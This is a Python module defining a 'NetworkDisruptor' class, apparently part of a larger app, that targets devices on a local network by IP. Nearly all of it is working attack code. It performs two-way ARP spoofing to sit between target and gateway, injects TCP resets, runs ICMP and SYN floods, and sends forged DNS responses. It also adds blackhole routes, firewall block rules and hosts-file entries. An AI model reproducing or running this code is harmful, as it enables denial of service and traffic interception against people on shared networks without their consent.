#!/usr/bin/env python3
"""
Enhanced Network Disruptor Module
Provides enterprise-level network disruption functionality
"""

import socket
import threading
import time
import random
import subprocess
import platform
import os
import sys
from typing import List, Dict, Optional
from app.logs.logger import log_info, log_error, log_warning

# Try to import Scapy, but handle gracefully if not available
try:
    from scapy.all import *
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    log_warning("Scapy not available - some advanced features will be disabled")

class NetworkDisruptor:
    """Enhanced enterprise-level network disconnection system"""
    
    def __init__(self):
        self.is_running = False
        self.blocked_devices = {}
        self.local_ip = None
        self.local_mac = None
        self.gateway_ip = None
        self.gateway_mac = None
        self.interface_name = None
        self.stop_event = threading.Event()
        
        # Thread management
        self.arp_spoof_threads = {}
        self.packet_drop_threads = {}
        self.icmp_flood_threads = {}
        self.tcp_flood_threads = {}
        self.dns_poison_threads = {}
        
        # Attack intensity settings
        self.attack_intensity = "high"  # low, medium, high, extreme
        self.packet_rate = 1000  # packets per second
        self.attack_duration = 0  # 0 = continuous
        
    def initialize(self) -> bool:
        """Initialize the network disruptor with enhanced detection"""
        try:
            log_info("🔧 Initializing enhanced network disruptor...")
            
            # Get network information
            self.local_ip = self._get_local_ip()
            self.local_mac = self._get_local_mac()
            self.gateway_ip = self._get_gateway_ip()
            self.gateway_mac = self._get_mac_address(self.gateway_ip)
            self.interface_name = self._get_interface_name()
            
            if not all([self.local_ip, self.gateway_ip]):
                log_error("Failed to get network information")
                return False
            
            log_info(f"✅ Network disruptor initialized:")
            log_info(f"   Local IP: {self.local_ip}")
            log_info(f"   Local MAC: {self.local_mac}")
            log_info(f"   Gateway IP: {self.gateway_ip}")
            log_info(f"   Gateway MAC: {self.gateway_mac}")
            log_info(f"   Interface: {self.interface_name}")
            
            return True
            
        except Exception as e:
            log_error(f"Failed to initialize network disruptor: {e}")
            return False
    
    def _get_local_ip(self) -> str:
        """Get local IP address with enhanced detection"""
        try:
            # Method 1: Socket-based detection
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.connect(("8.8.8.8", 80))
            local_ip = sock.getsockname()[0]
            sock.close()
            return local_ip
        except:
            pass
        
        try:
            # Method 2: Platform-specific detection
            if platform.system() == "Windows":
                result = subprocess.run(["ipconfig"], capture_output=True, text=True)
                lines = result.stdout.split('\n')
                for line in lines:
                    if "IPv4 Address" in line and "192.168" in line:
                        return line.split(":")[-1].strip()
            else:
                result = subprocess.run(["hostname", "-I"], capture_output=True, text=True)
                return result.stdout.strip().split()[0]
        except:
            pass
        
        return "192.168.1.100"  # Fallback
    
    def _get_local_mac(self) -> str:
        """Get local MAC address"""
        try:
            if platform.system() == "Windows":
                result = subprocess.run(["getmac", "/fo", "csv"], capture_output=True, text=True)
                lines = result.stdout.split('\n')
                for line in lines:
                    if self.local_ip in line:
                        mac = line.split(',')[0].strip('"')
                        return mac.replace('-', ':')
            else:
                result = subprocess.run(["ifconfig"], capture_output=True, text=True)
                lines = result.stdout.split('\n')
                for line in lines:
                    if "ether" in line:
                        return line.split("ether")[1].strip()
        except:
            pass
        
        return "00:11:22:33:44:55"  # Fallback
    
    def _get_gateway_ip(self) -> str:
        """Get gateway IP with enhanced detection"""
        try:
            # Method 1: Route table
            if platform.system() == "Windows":
                result = subprocess.run(["route", "print", "0.0.0.0"], capture_output=True, text=True)
                lines = result.stdout.split('\n')
                for line in lines:
                    if '0.0.0.0' in line and '0.0.0.0' not in line.split()[1]:
                        parts = line.split()
                        if len(parts) >= 4:
                            gateway = parts[3]
                            if self._is_valid_ip(gateway):
                                return gateway
            else:
                result = subprocess.run(["ip", "route", "show", "default"], capture_output=True, text=True)
                lines = result.stdout.split('\n')
                for line in lines:
                    if 'default via' in line:
                        parts = line.split()
                        gateway_index = parts.index('via') + 1
                        if gateway_index < len(parts):
                            gateway = parts[gateway_index]
                            if self._is_valid_ip(gateway):
                                return gateway
        except:
            pass
        
        # Method 2: Common gateway addresses
        common_gateways = ["192.168.1.1", "192.168.0.1", "10.0.0.1", "10.0.1.1"]
        for gateway in common_gateways:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1.0)
                result = sock.connect_ex((gateway, 80))
                sock.close()
                if result == 0:
                    return gateway
            except:
                continue
        
        return "192.168.1.1"  # Fallback
    
    def _is_valid_ip(self, ip: str) -> bool:
        """Validate IP address format"""
        try:
            import ipaddress
            ipaddress.ip_address(ip)
            return True
        except ValueError:
            return False
    
    def _get_mac_address(self, ip: str) -> str:
        """Get MAC address for an IP with enhanced detection"""
        try:
            # Use socket-based approach instead of subprocess
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1.0)
            
            # Try to connect to populate ARP table
            try:
                sock.connect((ip, 80))
                sock.close()
            except:
                pass
            
            # Try to get MAC from ARP table
            try:
                if platform.system() == "Windows":
                    result = subprocess.run(["arp", "-a"], capture_output=True, text=True)
                    if result.returncode == 0:
                        lines = result.stdout.split('\n')
                        for line in lines:
                            if ip in line:
                                parts = line.split()
                                for part in parts:
                                    if ':' in part or '-' in part:
                                        mac = part.replace('-', ':')
                                        if self._is_valid_mac(mac):
                                            return mac
                else:
                    result = subprocess.run(["arp", "-n"], capture_output=True, text=True)
                    if result.returncode == 0:
                        lines = result.stdout.split('\n')
                        for line in lines:
                            if ip in line:
                                parts = line.split()
                                for part in parts:
                                    if ':' in part or '-' in part:
                                        mac = part.replace('-', ':')
                                        if self._is_valid_mac(mac):
                                            return mac
            except:
                pass
        except:
            pass
        
        return "ff:ff:ff:ff:ff:ff"  # Broadcast MAC as fallback
    
    def _is_valid_mac(self, mac: str) -> bool:
        """Validate MAC address format"""
        try:
            if len(mac) != 17:
                return False
            parts = mac.split(':')
            if len(parts) != 6:
                return False
            for part in parts:
                if len(part) != 2:
                    return False
                int(part, 16)
            return True
        except:
            return False
    
    def _get_interface_name(self) -> str:
        """Get network interface name"""
        try:
            if platform.system() == "Windows":
                result = subprocess.run(["netsh", "interface", "show", "interface"], capture_output=True, text=True)
                lines = result.stdout.split('\n')
                for line in lines:
                    if "Connected" in line and ("Ethernet" in line or "Wi-Fi" in line):
                        parts = line.split()
                        if len(parts) >= 4:
                            return parts[-1]
            else:
                result = subprocess.run(["ip", "link", "show"], capture_output=True, text=True)
                lines = result.stdout.split('\n')
                for line in lines:
                    if "UP" in line and ":" in line:
                        interface = line.split(':')[1].strip()
                        if interface and not interface.startswith('lo'):
                            return interface
        except:
            pass
        
        return "eth0"  # Fallback
    
    def disconnect_device(self, target_ip: str, methods: List[str] = None) -> bool:
        """Disconnect a device using enhanced enterprise-level methods"""
        if methods is None:
            methods = ["arp_spoof", "packet_drop", "route_blackhole", "firewall", "icmp_flood", "tcp_flood", "dns_poison"]
        
        try:
            log_info(f"🎯 Starting enhanced disconnection for {target_ip}")
            log_info(f"🎯 Methods: {methods}")
            
            # Validate target IP
            if not target_ip or target_ip in ["0.0.0.0", "127.0.0.1"]:
                log_error(f"Invalid target IP: {target_ip}")
                return False
            
            if target_ip in self.blocked_devices:
                log_info(f"Device {target_ip} is already being disrupted")
                return True
            
            # Get target MAC address
            target_mac = self._get_mac_address(target_ip)
            log_info(f"Target MAC for {target_ip}: {target_mac}")
            
            self.blocked_devices[target_ip] = {
                'methods': {},
                'target_mac': target_mac,
                'start_time': time.time()
            }
            
            success_count = 0
            
            # Method 1: Enhanced ARP Spoofing
            if "arp_spoof" in methods and SCAPY_AVAILABLE:
                try:
                    if self._start_arp_spoofing(target_ip, target_mac):
                        self.blocked_devices[target_ip]['methods']['arp_spoof'] = True
                        success_count += 1
                        log_info(f"✅ ARP spoofing started for {target_ip}")
                except Exception as e:
                    log_error(f"ARP spoofing failed for {target_ip}: {e}")
            
            # Method 2: Enhanced Packet Dropping
            if "packet_drop" in methods and SCAPY_AVAILABLE:
                try:
                    if self._start_packet_dropping(target_ip):
                        self.blocked_devices[target_ip]['methods']['packet_drop'] = True
                        success_count += 1
                        log_info(f"✅ Packet dropping started for {target_ip}")
                except Exception as e:
                    log_error(f"Packet dropping failed for {target_ip}: {e}")
            
            # Method 3: Route Blackhole
            if "route_blackhole" in methods:
                try:
                    if self._add_blackhole_route(target_ip):
                        self.blocked_devices[target_ip]['methods']['route_blackhole'] = True
                        success_count += 1
                        log_info(f"✅ Route blackhole added for {target_ip}")
                except Exception as e:
                    log_error(f"Route blackhole failed for {target_ip}: {e}")
            
            # Method 4: Firewall Rules
            if "firewall" in methods:
                try:
                    if self._add_firewall_rule(target_ip):
                        self.blocked_devices[target_ip]['methods']['firewall'] = True
                        success_count += 1
                        log_info(f"✅ Firewall rule added for {target_ip}")
                except Exception as e:
                    log_error(f"Firewall rule failed for {target_ip}: {e}")
            
            # Method 5: Windows Aggressive Blocking
            if platform.system() == "Windows":
                try:
                    if self._add_windows_aggressive_blocking(target_ip):
                        self.blocked_devices[target_ip]['methods']['windows_aggressive'] = True
                        success_count += 1
                        log_info(f"✅ Windows aggressive blocking added for {target_ip}")
                except Exception as e:
                    log_error(f"Windows aggressive blocking failed for {target_ip}: {e}")
            
            # Method 6: ICMP Flood
            if "icmp_flood" in methods:
                try:
                    if self._start_icmp_flood(target_ip):
                        self.blocked_devices[target_ip]['methods']['icmp_flood'] = True
                        success_count += 1
                        log_info(f"✅ ICMP flood started for {target_ip}")
                except Exception as e:
                    log_error(f"ICMP flood failed for {target_ip}: {e}")
            
            # Method 7: TCP Flood
            if "tcp_flood" in methods:
                try:
                    if self._start_tcp_flood(target_ip):
                        self.blocked_devices[target_ip]['methods']['tcp_flood'] = True
                        success_count += 1
                        log_info(f"✅ TCP flood started for {target_ip}")
                except Exception as e:
                    log_error(f"TCP flood failed for {target_ip}: {e}")
            
            # Method 8: DNS Poisoning
            if "dns_poison" in methods:
                try:
                    if self._start_dns_poisoning(target_ip):
                        self.blocked_devices[target_ip]['methods']['dns_poison'] = True
                        success_count += 1
                        log_info(f"✅ DNS poisoning started for {target_ip}")
                except Exception as e:
                    log_error(f"DNS poisoning failed for {target_ip}: {e}")
            
            log_info(f"🎯 Enhanced disconnection completed for {target_ip}: {success_count}/{len(methods)} methods successful")
            return success_count > 0
            
        except Exception as e:
            log_error(f"Enhanced disconnection failed for {target_ip}: {e}")
            return False
    
    def _start_arp_spoofing(self, target_ip: str, target_mac: str) -> bool:
        """Start enhanced ARP spoofing attack"""
        try:
            def arp_spoof_worker():
                log_info(f"🎯 Starting enhanced ARP spoofing on {target_ip}")
                
                while target_ip in self.blocked_devices and self.is_running and not self.stop_event.is_set():
                    try:
                        # Send multiple ARP spoofing packets
                        for _ in range(100):  # Increased packet rate
                            # Tell target we are gateway
                            arp_packet = Ether(dst=target_mac, src=self.local_mac) / ARP(
                                op=2,  # ARP reply
                                psrc=self.gateway_ip,  # Spoof gateway IP
                                pdst=target_ip,  # Target IP
                                hwsrc=self.local_mac,  # Our MAC
                                hwdst=target_mac  # Target MAC
                            )
                            send(arp_packet, verbose=False, iface=self.interface_name)
                            
                            # Tell gateway we are target
                            arp_packet2 = Ether(dst=self.gateway_mac, src=self.local_mac) / ARP(
                                op=2,  # ARP reply
                                psrc=target_ip,  # Spoof target IP
                                pdst=self.gateway_ip,  # Gateway IP
                                hwsrc=self.local_mac,  # Our MAC
                                hwdst=self.gateway_mac  # Gateway MAC
                            )
                            send(arp_packet2, verbose=False, iface=self.interface_name)
                        
                        time.sleep(0.01)  # Very aggressive timing
                        
                    except Exception as e:
                        log_error(f"ARP spoofing error for {target_ip}: {e}")
                        break
                
                log_info(f"🛑 ARP spoofing stopped for {target_ip}")
            
            # Start ARP spoofing thread
            thread = threading.Thread(target=arp_spoof_worker, daemon=True)
            thread.start()
            self.arp_spoof_threads[target_ip] = thread
            
            return True
            
        except Exception as e:
            log_error(f"Failed to start ARP spoofing for {target_ip}: {e}")
            return False
    
    def _start_packet_dropping(self, target_ip: str) -> bool:
        """Start enhanced packet dropping"""
        try:
            def packet_drop_worker():
                log_info(f"🎯 Starting enhanced packet dropping on {target_ip}")
                
                while target_ip in self.blocked_devices and self.is_running and not self.stop_event.is_set():
                    try:
                        # Send RST packets to terminate connections
                        for port in [80, 443, 22, 21, 25, 53, 110, 143, 993, 995, 8080, 8443]:
                            try:
                                # Create RST packet
                                rst_packet = IP(dst=target_ip) / TCP(dport=port, flags="R")
                                send(rst_packet, verbose=False, iface=self.interface_name)
                            except:
                                pass
                        
                        time.sleep(0.1)
                        
                    except Exception as e:
                        log_error(f"Packet dropping error for {target_ip}: {e}")
                        break
                
                log_info(f"🛑 Packet dropping stopped for {target_ip}")
            
            # Start packet dropping thread
            thread = threading.Thread(target=packet_drop_worker, daemon=True)
            thread.start()
            self.packet_drop_threads[target_ip] = thread
            
            return True
            
        except Exception as e:
            log_error(f"Failed to start packet dropping for {target_ip}: {e}")
            return False
    
    def _add_blackhole_route(self, target_ip: str) -> bool:
        """Add blackhole route for target IP"""
        try:
            if platform.system() == "Windows":
                # Add route that drops traffic to target
                cmd = f"route add {target_ip} mask 255.255.255.255 0.0.0.0 metric 1"
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                if result.returncode == 0:
                    log_info(f"✅ Blackhole route added for {target_ip}")
                    return True
            else:
                # Linux route blackhole
                cmd = f"ip route add blackhole {target_ip}"
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                if result.returncode == 0:
                    log_info(f"✅ Blackhole route added for {target_ip}")
                    return True
            
            return False
            
        except Exception as e:
            log_error(f"Failed to add blackhole route for {target_ip}: {e}")
            return False
    
    def _add_firewall_rule(self, target_ip: str) -> bool:
        """Add Windows Firewall rule to block target IP"""
        try:
            if platform.system() == "Windows":
                # Add outbound rule
                cmd = f'netsh advfirewall firewall add rule name="Block {target_ip}" dir=out action=block remoteip={target_ip}'
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                
                # Add inbound rule
                cmd2 = f'netsh advfirewall firewall add rule name="Block {target_ip} In" dir=in action=block remoteip={target_ip}'
                result2 = subprocess.run(cmd2, shell=True, capture_output=True, text=True)
                
                if result.returncode == 0 and result2.returncode == 0:
                    log_info(f"✅ Firewall rules added for {target_ip}")
                    return True
            
            return False
            
        except Exception as e:
            log_error(f"Failed to add firewall rule for {target_ip}: {e}")
            return False
    
    def _add_windows_aggressive_blocking(self, target_ip: str) -> bool:
        """Add aggressive Windows-specific blocking"""
        try:
            if platform.system() == "Windows":
                # Block in hosts file
                hosts_entry = f"\n{target_ip} block.local"
                with open(r"C:\Windows\System32\drivers\etc\hosts", "a") as f:
                    f.write(hosts_entry)
                
                # Flush DNS cache
                subprocess.run(["ipconfig", "/flushdns"], shell=True, capture_output=True)
                
                log_info(f"✅ Windows aggressive blocking added for {target_ip}")
                return True
            
            return False
            
        except Exception as e:
            log_error(f"Failed to add Windows aggressive blocking for {target_ip}: {e}")
            return False
    
    def _start_icmp_flood(self, target_ip: str) -> bool:
        """Start ICMP flood attack"""
        try:
            def icmp_flood_worker():
                log_info(f"🎯 Starting ICMP flood on {target_ip}")
                
                while target_ip in self.blocked_devices and self.is_running and not self.stop_event.is_set():
                    try:
                        # Send ICMP flood packets
                        for _ in range(1000):  # High packet rate
                            try:
                                icmp_packet = IP(dst=target_ip) / ICMP()
                                send(icmp_packet, verbose=False, iface=self.interface_name)
                            except:
                                pass
                        
                        time.sleep(0.01)
                        
                    except Exception as e:
                        log_error(f"ICMP flood error for {target_ip}: {e}")
                        break
                
                log_info(f"🛑 ICMP flood stopped for {target_ip}")
            
            # Start ICMP flood thread
            thread = threading.Thread(target=icmp_flood_worker, daemon=True)
            thread.start()
            self.icmp_flood_threads[target_ip] = thread
            
            return True
            
        except Exception as e:
            log_error(f"Failed to start ICMP flood for {target_ip}: {e}")
            return False
    
    def _start_tcp_flood(self, target_ip: str) -> bool:
        """Start TCP flood attack"""
        try:
            def tcp_flood_worker():
                log_info(f"🎯 Starting TCP flood on {target_ip}")
                
                while target_ip in self.blocked_devices and self.is_running and not self.stop_event.is_set():
                    try:
                        # Send TCP flood packets to common ports
                        for port in [80, 443, 22, 21, 25, 53, 110, 143, 993, 995, 8080, 8443]:
                            for _ in range(100):  # High packet rate per port
                                try:
                                    tcp_packet = IP(dst=target_ip) / TCP(dport=port, flags="S")
                                    send(tcp_packet, verbose=False, iface=self.interface_name)
                                except:
                                    pass
                        
                        time.sleep(0.01)
                        
                    except Exception as e:
                        log_error(f"TCP flood error for {target_ip}: {e}")
                        break
                
                log_info(f"🛑 TCP flood stopped for {target_ip}")
            
            # Start TCP flood thread
            thread = threading.Thread(target=tcp_flood_worker, daemon=True)
            thread.start()
            self.tcp_flood_threads[target_ip] = thread
            
            return True
            
        except Exception as e:
            log_error(f"Failed to start TCP flood for {target_ip}: {e}")
            return False
    
    def _start_dns_poisoning(self, target_ip: str) -> bool:
        """Start DNS poisoning attack"""
        try:
            def dns_poison_worker():
                log_info(f"🎯 Starting DNS poisoning on {target_ip}")
                
                while target_ip in self.blocked_devices and self.is_running and not self.stop_event.is_set():
                    try:
                        # Send fake DNS responses
                        for _ in range(100):
                            try:
                                # Create fake DNS response
                                dns_packet = IP(dst=target_ip) / UDP(dport=53) / DNS(
                                    qr=1,  # Response
                                    aa=1,  # Authoritative
                                    qd=DNSQR(qname="www.google.com", qtype="A"),
                                    an=DNSRR(rrname="www.google.com", type="A", rdata="0.0.0.0")
                                )
                                send(dns_packet, verbose=False, iface=self.interface_name)
                            except:
                                pass
                        
                        time.sleep(0.1)
                        
                    except Exception as e:
                        log_error(f"DNS poisoning error for {target_ip}: {e}")
                        break
                
                log_info(f"🛑 DNS poisoning stopped for {target_ip}")
            
            # Start DNS poisoning thread
            thread = threading.Thread(target=dns_poison_worker, daemon=True)
            thread.start()
            self.dns_poison_threads[target_ip] = thread
            
            return True
            
        except Exception as e:
            log_error(f"Failed to start DNS poisoning for {target_ip}: {e}")
            return False
    
    def reconnect_device(self, target_ip: str) -> bool:
        """Reconnect a device by removing all disruptions"""
        try:
            log_info(f"🔌 Reconnecting {target_ip}...")
            
            if target_ip not in self.blocked_devices:
                return True
            
            success_count = 0
            
            # Stop all attack threads
            if target_ip in self.arp_spoof_threads:
                self.arp_spoof_threads[target_ip].join(timeout=1)
                del self.arp_spoof_threads[target_ip]
                success_count += 1
            
            if target_ip in self.packet_drop_threads:
                self.packet_drop_threads[target_ip].join(timeout=1)
                del self.packet_drop_threads[target_ip]
                success_count += 1
            
            if target_ip in self.icmp_flood_threads:
                self.icmp_flood_threads[target_ip].join(timeout=1)
                del self.icmp_flood_threads[target_ip]
                success_count += 1
            
            if target_ip in self.tcp_flood_threads:
                self.tcp_flood_threads[target_ip].join(timeout=1)
                del self.tcp_flood_threads[target_ip]
                success_count += 1
            
            if target_ip in self.dns_poison_threads:
                self.dns_poison_threads[target_ip].join(timeout=1)
                del self.dns_poison_threads[target_ip]
                success_count += 1
            
            # Remove route blackhole
            try:
                if platform.system() == "Windows":
                    cmd = f"route delete {target_ip}"
                    subprocess.run(cmd, shell=True, capture_output=True)
                else:
                    cmd = f"ip route del blackhole {target_ip}"
                    subprocess.run(cmd, shell=True, capture_output=True)
                success_count += 1
            except:
                pass
            
            # Remove firewall rules
            try:
                if platform.system() == "Windows":
                    cmd = f'netsh advfirewall firewall delete rule name="Block {target_ip}"'
                    subprocess.run(cmd, shell=True, capture_output=True)
                    cmd2 = f'netsh advfirewall firewall delete rule name="Block {target_ip} In"'
                    subprocess.run(cmd2, shell=True, capture_output=True)
                    success_count += 1
            except:
                pass
            
            # Remove from blocked devices
            del self.blocked_devices[target_ip]
            
            log_info(f"✅ Reconnected {target_ip}: {success_count} methods cleared")
            return True
            
        except Exception as e:
            log_error(f"Failed to reconnect {target_ip}: {e}")
            return False
    
    def get_disrupted_devices(self) -> List[str]:
        """Get list of currently disrupted devices"""
        return list(self.blocked_devices.keys())
    
    def get_device_status(self, target_ip: str) -> Dict:
        """Get status of a specific device"""
        if target_ip in self.blocked_devices:
            return {
                'blocked': True,
                'methods': self.blocked_devices[target_ip]['methods'],
                'start_time': self.blocked_devices[target_ip]['start_time'],
                'duration': time.time() - self.blocked_devices[target_ip]['start_time']
            }
        else:
            return {'blocked': False}
    
    def clear_all_disruptions(self) -> bool:
        """Clear all active disruptions"""
        try:
            log_info("🧹 Clearing all disruptions...")
            
            disrupted_devices = list(self.blocked_devices.keys())
            success_count = 0
            
            for device_ip in disrupted_devices:
                if self.reconnect_device(device_ip):
                    success_count += 1
            
            log_info(f"✅ Cleared {success_count}/{len(disrupted_devices)} disruptions")
            return success_count == len(disrupted_devices)
            
        except Exception as e:
            log_error(f"Failed to clear all disruptions: {e}")
            return False
    
    def start(self):
        """Start the network disruptor"""
        self.is_running = True
        self.stop_event.clear()
        log_info("🚀 Network disruptor started")
    
    def stop(self):
        """Stop the network disruptor"""
        self.is_running = False
        self.stop_event.set()
        
        # Clear all disruptions
        self.clear_all_disruptions()
        
        log_info("🛑 Network disruptor stopped")

# Global instance
# Global instance - Singleton pattern to prevent duplicate initialization
_network_disruptor = None

def get_network_disruptor():
    """Get singleton network disruptor instance"""
    global _network_disruptor
    if _network_disruptor is None:
        _network_disruptor = NetworkDisruptor()
    return _network_disruptor

# Backward compatibility
network_disruptor = get_network_disruptor() 
